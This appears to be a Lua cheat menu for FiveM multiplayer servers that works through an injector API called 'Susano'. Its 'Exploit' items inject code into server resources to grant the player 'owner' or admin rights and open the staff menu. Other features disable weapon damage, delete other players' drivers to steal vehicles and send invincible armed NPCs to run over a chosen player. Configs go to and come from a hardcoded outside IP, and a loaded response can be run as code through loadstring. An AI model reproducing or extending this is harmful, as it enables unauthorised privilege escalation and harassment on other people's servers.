                                local adjustedRotation = vector3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                                local direction = vector3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                                return direction
                            end
                            
                            local direction = RotationToDirection(camRot)
                            local dest = vector3(camPos.x + direction.x * 1000.0, camPos.y + direction.y * 1000.0, camPos.z + direction.z * 1000.0)
                            
                            local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                            local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                            
                            if hit == 1 and DoesEntityExist(entityHit) then
                                local entityType = GetEntityType(entityHit)
                                if entityType == 1 then
                                    local hitPed = entityHit
                                    for _, player in ipairs(GetActivePlayers()) do
                                        if player ~= PlayerId() then
                                            local targetPed = GetPlayerPed(player)
                                            if targetPed == hitPed then
                                                local targetServerId = GetPlayerServerId(player)
                                                Menu.SelectedPlayer = targetServerId
                                                
                                                if Menu.Visible then
                                                    for i, cat in ipairs(Menu.Categories) do
                                                        if cat.name == "Online" then
                                                            Menu.CurrentCategory = i
                                                            Menu.OpenedCategory = i
                                                            if cat.hasTabs then
                                                                for j, tab in ipairs(cat.tabs) do
                                                                    if tab.name == "Troll" then
                                                                        Menu.CurrentTab = j
                                                                        break
                                                                    end
                                                                end
                                                            end
                                                            break
                                                        end
                                                    end
                                                else
                                                    Menu.Visible = true
                                                    for i, cat in ipairs(Menu.Categories) do
                                                        if cat.name == "Online" then
                                                            Menu.CurrentCategory = i
                                                            Menu.OpenedCategory = i
                                                            if cat.hasTabs then
                                                                for j, tab in ipairs(cat.tabs) do
                                                                    if tab.name == "Troll" then
                                                                        Menu.CurrentTab = j
                                                                        break
                                                                    end
                                                                end
                                                            end
                                                            break
                                                        end
                                                    end
                                                end
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end

    Actions.disableWeaponDamageItem = FindItem("Exploit", "Exploits", "Disable Weapon Damage")
    if Actions.disableWeaponDamageItem then
        Actions.disableWeaponDamageItem.onClick = function(value)
            Menu.DisableWeaponDamage = value
            if value then
                CreateThread(function()
                    while Menu.DisableWeaponDamage do
                        Wait(0)
                        SetPlayerWeaponDamageModifier(PlayerId(), 0.0)
                        if type(susano) == "table" and type(susano.HookNative) == "function" then
                            if not Menu.WeaponDamageHookSet then
                                susano.HookNative(0x46E571A0D20E5076, function(player, modifier)
                                    if player == PlayerId() then
                                        return 0.0
                                    end
                                    return modifier
                                end)
                                Menu.WeaponDamageHookSet = true
                            end
                        end
                    end
                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                    Menu.WeaponDamageHookSet = false
                end)
            end
        end
    end

    Actions.menuStaffItem = FindItem("Exploit", "Exploits", "Menu Staff")
    if Actions.menuStaffItem then
        Actions.menuStaffItem.onClick = function()
            local targetResource = "Putin"

            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                if GetResourceState(targetResource) ~= "started" then
                    local alternatives = {"mapmanager", "spawnmanager", "sessionmanager", "baseevents", "chat", "hardcap", "esextended"}
                    for _, r in ipairs(alternatives) do
                        if GetResourceState(r) == "started" then
                            targetResource = r
                            break
                        end
                    end
                end

                local codeToInject = [[
                    if not GameMode then GameMode = {} end
                    if not GameMode.PlayerData then GameMode.PlayerData = {} end
                    GameMode.PlayerData.group = "owner"

                    if ESX then
                        if ESX.PlayerData then ESX.PlayerData.group = "owner" end
                        if ESX.SetPlayerData then ESX.SetPlayerData('group', 'owner') end
                    end

                    if not AdminSystem then AdminSystem = {} end
                    if not AdminSystem.Service then AdminSystem.Service = {} end
                    AdminSystem.Service.enabled = true

                    if type(ToggleMenu) == "function" then
                        ToggleMenu("staff")
                    end
                ]]

                Susano.InjectResource(targetResource, codeToInject)
            end
        end
    end

    Actions.reviveItem = FindItem("Exploit", "Exploits", "Revive")
    if Actions.reviveItem then
        Actions.reviveItem.onClick = function()
            if Menu and Menu.OpenInput then
                Menu.OpenInput("Confirmation", "tes sur tu vas perdre tes armes et ton argent sale ?", function(input)
                    if input and string.lower(input) == "oui" then
                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("Putin", [[
                                TriggerServerEvent('ambulance:requestRespawnHopital','normal')
                            ]])
                        end
                    end
                end)
            end
        end
    end

    local function SimpleJsonEncode(tbl, indent)
        indent = indent or 0
        local result = {}
        local isArray = true
        local maxIndex = 0
        
        for k, v in pairs(tbl) do
            if type(k) ~= "number" then
                isArray = false
                break
            end
            if k > maxIndex then maxIndex = k end
        end
        
        if maxIndex ~= #tbl then isArray = false end
        
        for k, v in pairs(tbl) do
            local key
            if isArray then
                key = ""
            else
                key = type(k) == "string" and '"' .. string.gsub(k, '"', '\\"') .. '"' or tostring(k)
            end
            
            local value
            if type(v) == "table" then
                value = SimpleJsonEncode(v, indent + 1)
            elseif type(v) == "string" then
                value = '"' .. string.gsub(v, '"', '\\"') .. '"'
            elseif type(v) == "boolean" then
                value = v and "true" or "false"
            elseif type(v) == "number" then
                value = tostring(v)
            else
                value = '"' .. tostring(v) .. '"'
            end
            
            if isArray then
                table.insert(result, value)
            else
                table.insert(result, key .. ":" .. value)
            end
        end
        
        if isArray then
            return "[" .. table.concat(result, ",") .. "]"
        else
            return "{" .. table.concat(result, ",") .. "}"
        end
    end
    
    local function CollectCurrentConfig()
        local config = {}
        
        for _, category in ipairs(Menu.Categories or {}) do
            if category.hasTabs and category.tabs then
                for _, tab in ipairs(category.tabs) do
                    if tab.items then
                        for _, item in ipairs(tab.items) do
                            if item.name and not item.isSeparator then
                                local key = category.name .. "|" .. tab.name .. "|" .. item.name
                                if item.type == "toggle" then
                                    config[key] = { type = "toggle", value = item.value or false }
                                    -- Also save bind if it exists
                                    if item.bindKey then
                                        config[key].bindKey = item.bindKey
                                        config[key].bindKeyName = item.bindKeyName
                                    end
                                elseif item.type == "selector" then
                                    config[key] = { type = "selector", selected = item.selected or 1 }
                                    -- Also save bind if it exists
                                    if item.bindKey then
                                        config[key].bindKey = item.bindKey
                                        config[key].bindKeyName = item.bindKeyName
                                    end
                                elseif item.type == "slider" then
                                    config[key] = { type = "slider", value = item.value or 0 }
                                    -- Also save bind if it exists
                                    if item.bindKey then
                                        config[key].bindKey = item.bindKey
                                        config[key].bindKeyName = item.bindKeyName
                                    end
                                elseif item.bindKey then
                                    config[key] = { type = "bind", key = item.bindKey, keyName = item.bindKeyName }
                                end
                            end
                        end
                    end
                end
            end
        end
        
        config["Menu.magicbulletEnabled"] = Menu.magicbulletEnabled or false
        config["Menu.noReloadEnabled"] = Menu.noReloadEnabled or false
        config["Menu.noRecoilEnabled"] = Menu.noRecoilEnabled or false
        config["Menu.noSpreadEnabled"] = Menu.noSpreadEnabled or false
        config["Menu.FOVWarp"] = Menu.FOVWarp or false
        config["Menu.ShowKeybinds"] = Menu.ShowKeybinds or false
        
        return config
    end
    
    local function ApplyConfig(config)
        if not config or type(config) ~= "table" then 
            print("ApplyConfig: Invalid config parameter")
            return 
        end
        
        if not Menu then
            print("ApplyConfig: Menu not available")
            return
        end
        
        -- Collect items that need to be activated (for sequential activation)
        local itemsToActivate = {}
        
        for key, data in pairs(config) do
            if not key or type(key) ~= "string" then
                print("ApplyConfig: Skipping invalid key: " .. tostring(key))
            else
                local success, err = pcall(function()
                    if string.find(key, "|") then
                    local parts = {}
                    for part in string.gmatch(key, "([^|]+)") do
                        table.insert(parts, part)
                    end
                    
                    if #parts == 3 then
                        local categoryName, tabName, itemName = parts[1], parts[2], parts[3]
                        if categoryName and tabName and itemName then
                            local item = FindItem(categoryName, tabName, itemName)
                            if item and type(item) == "table" and data and type(data) == "table" and data.type then
                                pcall(function()
                                    -- Verify item type matches data type before applying
                                    if data.type == "toggle" and data.value ~= nil and (not item.type or item.type == "toggle") then
                                        local boolValue = false
                                        if type(data.value) == "boolean" then
                                            boolValue = data.value
                                        elseif type(data.value) == "string" then
                                            boolValue = (data.value == "true" or data.value == "1")
                                        elseif type(data.value) == "number" then
                                            boolValue = (data.value ~= 0)
                                        end
                                        -- Set the value
                                        item.value = boolValue
                                        
                                        -- DISABLED: Automatic activation causes crashes
                                        -- Values are restored in menu, user must click manually to activate
                                        -- This prevents crashes while still restoring config state
                                        
                                        -- Restore bind if it exists in saved config
                                        if data.bindKey then
                                            item.bindKey = data.bindKey
                                        end
                                        if data.bindKeyName then
                                            item.bindKeyName = data.bindKeyName
                                        end
                                    elseif data.type == "selector" and data.selected ~= nil and (not item.type or item.type == "selector") then
                                        local selectedIndex = data.selected
                                        if type(selectedIndex) == "string" then
                                            selectedIndex = tonumber(selectedIndex)
                                            if not selectedIndex then selectedIndex = 1 end
                                        elseif type(selectedIndex) ~= "number" then
                                            selectedIndex = 1
                                        end
                                        if item.options and type(item.options) == "table" and type(selectedIndex) == "number" then
                                            local maxIndex = #item.options
                                            if selectedIndex >= 1 and selectedIndex <= maxIndex then
                                                -- Just set the selected index, don't call onClick to avoid crashes
                                                item.selected = selectedIndex
                                            end
                                        end
                                        -- Restore bind if it exists in saved config
                                        if data.bindKey then
                                            item.bindKey = data.bindKey
                                        end
                                        if data.bindKeyName then
                                            item.bindKeyName = data.bindKeyName
                                        end
                                    elseif data.type == "slider" and data.value ~= nil and (not item.type or item.type == "slider") then
                                        if type(data.value) == "number" then
                                            item.value = data.value
                                        end
                                        -- Restore bind if it exists in saved config
                                        if data.bindKey then
                                            item.bindKey = data.bindKey
                                        end
                                        if data.bindKeyName then
                                            item.bindKeyName = data.bindKeyName
                                        end
                                    elseif data.type == "bind" then
                                        if data.key then
                                            item.bindKey = data.key
                                        end
                                        if data.keyName then
                                            item.bindKeyName = data.keyName
                                        end
                                    end
                                end)
                            end
                        end
                    end
                elseif key == "Menu.magicbulletEnabled" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.magicbulletEnabled = boolValue
                    end
                elseif key == "Menu.noReloadEnabled" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.noReloadEnabled = boolValue
                    end
                elseif key == "Menu.noRecoilEnabled" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.noRecoilEnabled = boolValue
                    end
                elseif key == "Menu.noSpreadEnabled" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.noSpreadEnabled = boolValue
                    end
                elseif key == "Menu.FOVWarp" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.FOVWarp = boolValue
                    end
                elseif key == "Menu.ShowKeybinds" then
                    if Menu then
                        local boolValue = false
                        if type(data) == "boolean" then
                            boolValue = data
                        elseif type(data) == "string" then
                            boolValue = (data == "true" or data == "1")
                        elseif type(data) == "number" then
                            boolValue = (data ~= 0)
                        end
                        Menu.ShowKeybinds = boolValue
                    end
                end
                end)
                
                if not success then
                    print("Error applying config for key: " .. tostring(key) .. " - " .. tostring(err))
                end
            end
        end
        
        -- DISABLED: Automatic activation causes crashes
        -- All values are restored in the menu correctly
        -- User must manually click on each option in the menu to activate it
        -- This prevents crashes while still restoring the full config state
        print("[Config Load] Config values restored. Please click on options in menu to activate them.")
    end
    
    Actions.createConfigItem = FindItem("Settings", "Config", "Create Config")
    if Actions.createConfigItem then
        Actions.createConfigItem.onClick = function()
            if Menu and Menu.OpenInput then
                Menu.OpenInput("Create Config", "Enter a code for your config:", function(code)
                    if not code or code == "" then return end
                    
                    code = string.lower(string.gsub(code, "%s+", ""))
                    
                    local config = CollectCurrentConfig()
                    
                    CreateThread(function()
                        local jsonData = SimpleJsonEncode({ code = code, config = config })
                        local baseUrl = "http://82.22.7.19:25010"
                        
                        if type(Susano) == "table" and type(Susano.HttpGet) == "function" then
                            local encodedData = ""
                            for i = 1, #jsonData do
                                local byte = string.byte(jsonData, i)
                                if (byte >= 48 and byte <= 57) or (byte >= 65 and byte <= 90) or (byte >= 97 and byte <= 122) or byte == 45 or byte == 95 or byte == 46 or byte == 126 then
                                    encodedData = encodedData .. string.char(byte)
                                else
                                    encodedData = encodedData .. string.format("%%%02X", byte)
                                end
                            end
                            
                            local getUrl = baseUrl .. "/config/save?data=" .. encodedData
                            local status, response = Susano.HttpGet(getUrl)
                            
                            if status == 200 then
                                -- Config saved successfully
                            else
                                if Menu and Menu.OpenInput then
                                    Menu.OpenInput("Error", "Failed to save config. Status: " .. tostring(status), function() end)
                                end
                            end
                        else
                            if Menu and Menu.OpenInput then
                                Menu.OpenInput("Error", "HTTP functions not available", function() end)
                            end
                        end
                    end)
                end)
            end
        end
    end
    
    Actions.loadConfigItem = FindItem("Settings", "Config", "Load Config")
    if Actions.loadConfigItem then
        Actions.loadConfigItem.onClick = function()
            if Menu and Menu.OpenInput then
                Menu.OpenInput("Load Config", "Enter config code:", function(code)
                    if not code or code == "" then return end
                    
                    code = string.lower(string.gsub(code, "%s+", ""))
                    
                    if type(Susano) == "table" and type(Susano.HttpGet) == "function" then
                        CreateThread(function()
                            local status, response = Susano.HttpGet("http://82.22.7.19:25010/config/load?code=" .. code)
                            
                            if status == 200 and response then
                                if type(response) ~= "string" then
                                    response = tostring(response)
                                end
                                
                                local success, data, parseErr = pcall(function()
                                    if json and type(json.decode) == "function" then
                                        return json.decode(response)
                                    elseif loadstring then
                                        local func = loadstring("return " .. response)
                                        if func then
                                            return func()
                                        end
                                    end
                                    return nil
                                end)
                                
                                if not success then
                                    parseErr = data
                                    data = nil
                                end
                                
                                if success and data then
                                    local configToApply = data.config or data
                                    if configToApply and type(configToApply) == "table" then
                                        -- Wait a bit to ensure Menu is fully initialized
                                        Wait(100)
                                        
                                        -- Double check Menu is available
                                        if not Menu or not Menu.Categories then
                                            if Menu and Menu.OpenInput then
                                                Menu.OpenInput("Error", "Menu not ready. Please try again.", function() end)
                                            end
                                            return
                                        end
                                        
                                        local applySuccess, applyErr = pcall(function()
                                            ApplyConfig(configToApply)
                                        end)
                                        
                                        if applySuccess then
                                            -- Config loaded successfully
                                        else
                                            print("ApplyConfig error: " .. tostring(applyErr))
                                            if Menu and Menu.OpenInput then
                                                Menu.OpenInput("Error", "Failed to apply config: " .. tostring(applyErr), function() end)
                                            end
                                        end
                                    else
                                        print("Invalid config format. Type: " .. type(configToApply))
                                        if Menu and Menu.OpenInput then
                                            Menu.OpenInput("Error", "Invalid config format", function() end)
                                        end
                                    end
                                else
                                    print("Parse error: " .. tostring(parseErr) .. " | Response: " .. tostring(string.sub(response or "", 1, 100)))
                                    if Menu and Menu.OpenInput then
                                        Menu.OpenInput("Error", "Failed to parse config: " .. tostring(parseErr or "Unknown error"), function() end)
                                    end
                                end
                            elseif status == 404 then
                                if Menu and Menu.OpenInput then
                                    Menu.OpenInput("Error", "Config not found!", function() end)
                                end
                            else
                                if Menu and Menu.OpenInput then
                                    Menu.OpenInput("Error", "Failed to load config. Status: " .. tostring(status), function() end)
                                end
                            end
                        end)
                    end
                end)
            end
        end
    end

end



CreateThread(function()
    while true do
        local pool = {}
        if GetGamePool then
            pool = GetGamePool('CVehicle')
        else
            local handle, veh = FindFirstVehicle()
            if handle ~= -1 then
                repeat
                    table.insert(pool, veh)
                    found, veh = FindNextVehicle(handle)
                until not found
                EndFindVehicle(handle)
            end
        end

        local pPed = PlayerPedId()
        local pCoords = GetEntityCoords(pPed)
        local temp = {}

        for _, veh in ipairs(pool) do
            if DoesEntityExist(veh) and veh ~= GetVehiclePedIsIn(pPed, false) then
                local vCoords = GetEntityCoords(veh)
                local dist = #(pCoords - vCoords)
                if dist < 300.0 then
                    local model = GetEntityModel(veh)
                    local name = GetDisplayNameFromVehicleModel(model)
                    local label = GetLabelText(name)
                    if label ~= "NULL" then name = label end
                    table.insert(temp, {entity = veh, name = name, coords = vCoords, dist = dist})
                end
            end
        end
        table.sort(temp, function(a, b) return a.dist < b.dist end)
        foundVehicles = temp

        local radarSelector = FindItem("Vehicle", "Radar", "Select Vehicle")
        if radarSelector then
            local options = {}
            for _, vData in ipairs(foundVehicles) do
                table.insert(options, vData.name .. " [" .. math.floor(vData.dist) .. "m]")
            end
            if #options == 0 then options = {"Scanning..."} end
            radarSelector.options = options
            if radarSelector.selected > #options then radarSelector.selected = 1 end
        end

        Wait(500)
    end
end)

local function DrawText3D(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    if onScreen then
        SetTextScale(0.35, 0.35)
        SetTextFont(4)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 215)
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
        local factor = (string.len(text)) / 370
        DrawRect(_x, _y + 0.0125, 0.015 + factor, 0.03, 41, 11, 41, 68)
    end
end




do
    local item = FindItem("Vehicle", "Performance", "Give Nearest Vehicle")
    if item then
        item.onClick = function()
             local pPed = PlayerPedId()
            if #foundVehicles > 0 then
                local target = foundVehicles[1].entity
                if DoesEntityExist(target) then
                    local pCoords = GetEntityCoords(pPed)
                    local pHeading = GetEntityHeading(pPed)
                    local forward = GetEntityForwardVector(pPed)
                    local spawnPos = pCoords + (forward * 5.0)

                    NetworkRequestControlOfEntity(target)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(target) and timeout < 20 do
                        NetworkRequestControlOfEntity(target)
                        Wait(50)
                        timeout = timeout + 1
                    end

                    SetEntityCoords(target, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false, false)
                    SetEntityHeading(target, pHeading)
                    PlaceObjectOnGroundProperly(target)
                else
                end
            else
            end
        end
    end
end



CreateThread(function()
    local lastHighlighted = nil
    while true do
        local sleep = 250
        local selector = FindItem("Vehicle", "Radar", "Select Vehicle")
        local highlightToggle = FindItem("Vehicle", "Radar", "Highlight Selected")

        local isHighlightEnabled = highlightToggle and highlightToggle.value

        if Menu and (Menu.CurrentTab == "Radar" or Menu.ActiveTab == "Radar") then
            isHighlightEnabled = true
        end

        if selector and foundVehicles and isHighlightEnabled then
            local index = selector.selected
            if index and foundVehicles[index] then
                local vehicle = foundVehicles[index].entity
                if DoesEntityExist(vehicle) then
                    sleep = 0

                    if lastHighlighted and lastHighlighted ~= vehicle then
                        SetEntityDrawOutline(lastHighlighted, false)
                    end

                    SetEntityDrawOutline(vehicle, true)
                    SetEntityDrawOutlineColor(vehicle, 255, 255, 0, 255)
                    lastHighlighted = vehicle
                else
                    if lastHighlighted then
                        SetEntityDrawOutline(lastHighlighted, false)
                        lastHighlighted = nil
                    end
                end
            else
                if lastHighlighted then
                    SetEntityDrawOutline(lastHighlighted, false)
                    lastHighlighted = nil
                end
            end
        else
            if lastHighlighted then
                SetEntityDrawOutline(lastHighlighted, false)
                lastHighlighted = nil
            end
        end

        Wait(sleep)
    end
end)


CreateThread(function()
    local function RequestControl(entity, timeout)
        local t = 0
        while not NetworkHasControlOfEntity(entity) and t < timeout do
            NetworkRequestControlOfEntity(entity)
            Wait(10)
            t = t + 10
        end
        return NetworkHasControlOfEntity(entity)
    end

    while true do
        local sleep = 100

        if Menu.FOVWarp and Susano and Susano.GetAsyncKeyState and Susano.GetAsyncKeyState(0x58) then
            sleep = 0
            local playerPed = PlayerPedId()
            if not IsPedInAnyVehicle(playerPed, false) then
                local camCoords = GetGameplayCamCoord()
                local camRot = GetGameplayCamRot(2)

                local fwd = vector3(
                    -math.sin(math.rad(camRot.z)) * math.abs(math.cos(math.rad(camRot.x))),
                    math.cos(math.rad(camRot.z)) * math.abs(math.cos(math.rad(camRot.x))),
                    math.sin(math.rad(camRot.x))
                )

                local endCoords = camCoords + (fwd * 1000.0)


                local ray = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, endCoords.x, endCoords.y, endCoords.z, 2, playerPed, 0)
                local _, hit, hitCoords, surfaceNormal, entityHit = GetShapeTestResult(ray)

                if hit and entityHit and DoesEntityExist(entityHit) and IsEntityAVehicle(entityHit) then
                    local attempts = 0
                    while not NetworkHasControlOfEntity(entityHit) and attempts < 10 do
                        NetworkRequestControlOfEntity(entityHit)
                        Wait(10)
                        attempts = attempts + 1
                    end

                    local driver = GetPedInVehicleSeat(entityHit, -1)
                    if DoesEntityExist(driver) then
                        local maxSeats = GetVehicleMaxNumberOfPassengers(entityHit)
                        local freeSeat = nil
                        for i = 0, maxSeats - 1 do
                            if IsVehicleSeatFree(entityHit, i) then
                                freeSeat = i
                                break
                            end
                        end

                        if freeSeat then
                            SetPedIntoVehicle(playerPed, entityHit, freeSeat)
                            Wait(150)
                        end

                        NetworkRequestControlOfEntity(driver)
                        ClearPedTasksImmediately(driver)
                        SetEntityAsMissionEntity(driver, true, true)
                        SetEntityCoords(driver, 0.0, 0.0, -100.0, false, false, false, false)
                        Wait(50)
                        DeleteEntity(driver)

                        SetPedIntoVehicle(playerPed, entityHit, -1)
                    else
                        SetPedIntoVehicle(playerPed, entityHit, -1)
                    end

                    Wait(500)
                end
            end
        end

        if Menu.WarpPressW and Susano and Susano.GetAsyncKeyState and Susano.GetAsyncKeyState(0x57) then
            sleep = 0
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                local drv = GetPedInVehicleSeat(vehicle, -1)

                if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                    Wait(150)

                    RequestControl(drv, 750)
                    ClearPedTasksImmediately(drv)
                    SetEntityAsMissionEntity(drv, true, true)
                    SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                    Wait(50)
                    DeleteEntity(drv)

                    SetPedIntoVehicle(playerPed, vehicle, -1)
                    Wait(500)
                end
            end
        end

        Wait(sleep)
    end
end)

-- ============================================
-- GIANT PROPS SYSTEM
-- ============================================
local GiantPropModels = {
    ["Chiliad Rock"]     = "prop_rock_4_a",
    ["Highway Ramp"]     = "prop_highway_att01",
    ["Crane"]            = "prop_movint_yourwall",
    ["Radio Tower"]      = "prop_air_towlight_02",
    ["Oil Tank"]         = "prop_gas_tank_02a",
    ["Container Stack"]  = "prop_container_ld2",
    ["Bridge Section"]   = "des_metstation_k9_dp",
    ["Satellite Dish"]   = "prop_cs_satellite_dish",
}

_G._giantPropsStore = _G._giantPropsStore or {}
Menu.SelectedGiantProp = Menu.SelectedGiantProp or "Chiliad Rock"

function Menu.SpawnGiantProp(model, coords, heading, freeze)
    local hash = GetHashKey(model)
    RequestModel(hash)
    local t = 50
    while not HasModelLoaded(hash) and t > 0 do Citizen.Wait(10); t = t - 1 end
    if not HasModelLoaded(hash) then
        print("[GiantProp] ERROR: Failed to load " .. model)
        return 0
    end

    local obj = CreateObject(hash, coords.x, coords.y, coords.z, false, false, false)
    if obj and obj ~= 0 and DoesEntityExist(obj) then
        SetEntityHeading(obj, heading or 0.0)
        SetEntityAsMissionEntity(obj, true, true)
        if freeze ~= false then
            FreezeEntityPosition(obj, true)
        end
        SetEntityCollision(obj, true, true)
        SetModelAsNoLongerNeeded(hash)
        _G._giantPropsStore[#_G._giantPropsStore + 1] = obj
        print("[GiantProp] Spawned " .. model .. " handle=" .. tostring(obj))
    else
        print("[GiantProp] ERROR: CreateObject returned " .. tostring(obj))
    end
    return obj
end

-- [REMOVED] Giant Prop handlers (menu items deleted)

-- ============================================
-- RAMP (two solid world props)
-- ============================================
-- NOTE: the ramps are real, collidable props placed on the ground. They are
-- not attached to the car and there is no force push: a vehicle drives up the
-- ramp naturally, without the upward hop the old ejection system caused.
-- ============================================
_G._buggyRampHandles = _G._buggyRampHandles or {}
_G._buggyRampVeh = nil
_G._buggyRampThread = false
_G._buggyRampForceThread = false
_G._buggyRampCooldowns = {} -- anti-spam : 1 force par véhicule

local RAMP_MODEL_PRIMARY  = "prop_mp_ramp_01"
local RAMP_MODEL_FALLBACK = "lts_prop_lts_ramp_01"

-- The ramp is a real, solid world prop. It is deliberately NOT welded to the
-- car: a collidable prop attached to a vehicle transfers every ground contact
-- to the chassis, which is what made the car hop. There is no ejection force
-- either, the ramp does the job on its own.
Menu.RampEjectPower = nil

-- Helper : load model with fallback
local function LoadRampModel()
    local hash = GetHashKey(RAMP_MODEL_PRIMARY)
    RequestModel(hash)
    local t = 50
    while not HasModelLoaded(hash) and t > 0 do Citizen.Wait(10); t = t - 1 end
    if HasModelLoaded(hash) then return hash, RAMP_MODEL_PRIMARY end

    hash = GetHashKey(RAMP_MODEL_FALLBACK)
    RequestModel(hash)
    t = 50
    while not HasModelLoaded(hash) and t > 0 do Citizen.Wait(10); t = t - 1 end
    if HasModelLoaded(hash) then return hash, RAMP_MODEL_FALLBACK end

    return nil, nil
end

function Menu.AttachBuggyRamp()
    Menu.DetachBuggyRamp()

    local playerPed = PlayerPedId()
    local veh = GetVehiclePedIsIn(playerPed, false)
    if not veh or veh == 0 then
        print("[Ramp] Not in a vehicle")
        return
    end

    local hash, modelName = LoadRampModel()
    if not hash then
        print("[Ramp] All models failed to load")
        return
    end

    local vehModel = GetEntityModel(veh)
    local _, vMax = GetModelDimensions(vehModel)
    local rMin, rMax = GetModelDimensions(hash)

    local rampHalfWidth = (rMax.x - rMin.x) * 0.5
    if not rampHalfWidth or rampHalfWidth < 0.2 then rampHalfWidth = 1.0 end

    local heading = GetEntityHeading(veh)
    local handles = {}

    -- Two ramps side by side, planted on the ground just ahead of the bumper.
    for _, offsetX in ipairs({ -rampHalfWidth, rampHalfWidth }) do
        local pos = GetOffsetFromEntityInWorldCoords(veh, offsetX, vMax.y + 2.2, 0.0)
        local obj = CreateObject(hash, pos.x, pos.y, pos.z + 0.5, true, true, false)

        if obj and obj ~= 0 and DoesEntityExist(obj) then
            SetEntityAsMissionEntity(obj, true, true)
            SetEntityRotation(obj, 0.0, 0.0, heading + 180.0, 2, true)
            PlaceObjectOnGroundProperly(obj)

            -- real prop: solid collision, planted, indestructible
            SetEntityCollision(obj, true, true)
            SetEntityInvincible(obj, true)
            FreezeEntityPosition(obj, true)

            handles[#handles + 1] = obj
        end
    end

    if #handles == 0 then
        SetModelAsNoLongerNeeded(hash)
        return
    end

    _G._buggyRampHandles = handles
    _G._buggyRampVeh = veh
    _G._buggyRampCooldowns = {}
    SetModelAsNoLongerNeeded(hash)
    print("[Ramp] Placed " .. #handles .. "x " .. modelName .. " (solid, no ejection)")
end

function Menu.DetachBuggyRamp()
    _G._buggyRampThread = false
    _G._buggyRampForceThread = false

    for _, obj in ipairs(_G._buggyRampHandles) do
        if obj and DoesEntityExist(obj) then
            pcall(SetEntityInvincible, obj, false)
            DetachEntity(obj, true, true)
            SetEntityAsMissionEntity(obj, true, true)
            DeleteEntity(obj)
        end
    end
    _G._buggyRampHandles = {}
    _G._buggyRampVeh = nil
    _G._buggyRampCooldowns = {}
    print("[Ramp] Removed")
end

-- Eject Power selector was removed with the force-throw system: a real ramp
-- needs no assistance.

Actions.attachRamp = FindItem("Vehicle", "Performance", "Attach Ramp")
if Actions.attachRamp then
    Actions.attachRamp.onClick = function()
        Menu.AttachBuggyRamp()
    end
end

Actions.detachRamp = FindItem("Vehicle", "Performance", "Detach Ramp")
if Actions.detachRamp then
    Actions.detachRamp.onClick = function()
        Menu.DetachBuggyRamp()
    end
end

-- ============================================
-- ASSAULT DRIVER (Adaptive CarKill AI)
-- ============================================
_G._assaultDriverPed = nil
_G._assaultDriverVeh = nil
_G._assaultDriverActive = false

function Menu.StartAssaultDriver(attackerPed, attackerVeh, targetPed)
    SetDriverAbility(attackerPed, 1.0)
    SetDriverAggressiveness(attackerPed, 1.0)
    SetBlockingOfNonTemporaryEvents(attackerPed, true)
    SetPedKeepTask(attackerPed, true)
    SetEntityInvincible(attackerPed, true)
    SetEntityInvincible(attackerVeh, true)

    -- Armer le ped pour le mode combat véhicule
    GiveWeaponToPed(attackerPed, GetHashKey("WEAPON_MICROSMG"), 9999, false, true)

    _G._assaultDriverActive = true
    local lastMode = nil -- "carkill" ou "chase"

    Citizen.CreateThread(function()
        while _G._assaultDriverActive do
            if not DoesEntityExist(attackerPed) or not DoesEntityExist(attackerVeh)
               or not DoesEntityExist(targetPed) or IsPedDeadOrDying(attackerPed, true) then
                print("[AssaultDriver] Driver or target lost, stopping")
                _G._assaultDriverActive = false
                break
            end

            -- Re-place le driver si éjecté
            if not IsPedInVehicle(attackerPed, attackerVeh, false) then
                SetPedIntoVehicle(attackerPed, attackerVeh, -1)
                Citizen.Wait(100)
            end

            -- Détection : cible à pied ou en véhicule ?
            local targetVeh = GetVehiclePedIsIn(targetPed, false)
            local targetInVehicle = targetVeh ~= 0 and DoesEntityExist(targetVeh)

            if not targetInVehicle then
                -- === MODE CARKILL : cible à pied ===
                -- TaskVehicleMissionPedTarget = foncer sur le ped pour l'écraser
                if lastMode ~= "carkill" then
                    ClearPedTasks(attackerPed)
                    Citizen.Wait(50)
                    print("[AssaultDriver] Mode CARKILL (target on foot)")
                    lastMode = "carkill"
                end

